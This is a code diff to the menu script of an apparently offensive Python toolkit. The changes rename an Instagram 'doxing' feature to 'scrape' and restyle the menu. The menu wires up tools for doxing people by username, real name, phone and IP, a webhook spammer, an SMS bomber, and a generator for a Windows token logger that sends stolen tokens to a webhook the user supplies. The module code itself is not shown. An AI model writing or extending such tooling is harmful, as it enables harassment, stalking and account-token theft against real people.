@@ -24,7 +24,7 @@ from colorama import Fore
 import socket
 
 import utils.twitter_scraping
-from utils import search_realname, search_username, igdox, whois_lookup, webhook_spammer, ip_scanner, ip_lookup, \
+from utils import search_realname, search_username, ig_scrape, whois_lookup, webhook_spammer, ip_scanner, ip_lookup, \
     phonenumber_lookup, websearch, smsbomber, tokenlogger_generator, twitter_scraping
 
 if os.name == "nt":
@@ -71,30 +71,30 @@ def main():
 
     while 1:
         print(Fore.CYAN)
-        print("[1] IGDox              ||   [2] WebSearch")
-        print("[3] PhoneLookup        ||   [4] Iplookup")
-        print("[5] UsernameSearch     ||   [6] RealNameSearch")
-        print("[7] IpScanner          ||   [8] WebhookSpammer")
-        print("[9] WhoIs              ||   [10] SMSBomber (US Only!)")
+        print("[1] IG Scrape          ||   [2] Web Search")
+        print("[3] Phone Lookup       ||   [4] Ip Lookup")
+        print("[5] Username Search    ||   [6] Name Search")
+        print("[7] Ip Scanner         ||   [8] Webhook Spammer")
+        print("[9] WhoIs              ||   [10] SMS Bomber (US Only!)")
         print("[11] About             ||   [12] Update")
-        print("[13] TLoggerGenerator  ||   [14] Twitter Scrapy")
+        print("[13] TLogger Generator ||   [14] Twitter Scrapy")
         print("[15] Exit")
         print("\n")
 
         a = input("[*] Select your option : \t")
 
         if a == "1":
-            if not os.path.exists("igdox"):
-                os.mkdir("igdox")
+            if not os.path.exists("igscrape"):
+                os.mkdir("igscrape")
                 print(Fore.RED + "[*] It appears that you are running this tool for the first time!")
-                print(Fore.RED + "[*] Put your credentials in the file named 'username.txt' and 'password.txt' in the 'igdox' folder!")
-                b = input(Fore.RED + "[*] Or do you want to type your credentials now? (y/n)")
+                print(Fore.RED + "[*] Put your credentials in the file named 'username.txt' and 'password.txt' in the 'igscrape' folder!")
+                b = input(Fore.RED + "[*] Or do you want to type your credentials now? (y/n) : ")
                 if b == "y":
                     c = input("[*] Enter your username : \t")
                     d = input("[*] Enter your password : \t")
-                    with open("igdox/username.txt", "w") as f:
+                    with open("igscrape/username.txt", "w") as f:
                         f.write(c)
-                    with open("igdox/password.txt", "w") as f:
+                    with open("igscrape/password.txt", "w") as f:
                         f.write(d)
                     print(Fore.GREEN + "[*] Credentials saved!")
                     time.sleep(2)
@@ -102,11 +102,11 @@ def main():
 
             else:
                 # If username.txt or password.txt is empty then ask for credentials
-                if os.stat("igdox/username.txt").st_size == 0 or os.stat("igdox/password.txt").st_size == 0:
+                if os.stat("igscrape/username.txt").st_size == 0 or os.stat("igscrape/password.txt").st_size == 0:
                     print(Fore.RED + "[*] username.txt/password.txt is empty!")
                     return
                 target = str(input("Enter a Username : \t")).replace(" ", "_")
-                igdox.Dox(target)
+                ig_scrape.Scrape(target)
                 time.sleep(1)
 
         elif a == "2":
@@ -122,8 +122,8 @@ def main():
             ip_lookup.FindIp(ip)
 
         elif a == "5":
-            print("WARNING! This feature is really poorly made and shows false positives!")
-            username = str(input("Enter a Username : \t")).replace(" ", "_")
+            print(f"{Fore.RED} WARNING! This feature is really poorly made and shows false positives!")
+            username = str(input(f"{Fore.GREEN}Enter a Username : \t")).replace(" ", "_")
             print("\n")
             search_username.instagram(username)
             search_username.pinterest(username)
@@ -137,8 +137,8 @@ def main():
             search_username.twitch(username)
 
         elif a == "6":
-            print("WARNING! This feature is really poorly made and shows false positives!")
-            name = str(input("Enter a name : \t"))
+            print(f"{Fore.RED} WARNING! This feature is really poorly made and shows false positives!")
+            name = str(input(f"{Fore.GREEN}Enter a name : \t"))
             search_realname.facebook(name)
             search_realname.linkedin(name)
             search_realname.whitepages(name)
@@ -182,8 +182,8 @@ def main():
             time.sleep(1)
 
         elif a == "13":
-            print("Note! Tokenlogger only works on Windows machines!")
-            webhook_url = input("Enter a webhook url : \t")
+            print(f"{Fore.RED}Note! Tokenlogger only works on Windows machines!")
+            webhook_url = input(f"{Fore.GREEN}Enter a webhook url : \t")
             tokenlogger_generator.Create(webhook_url)
 
         elif a == "14":
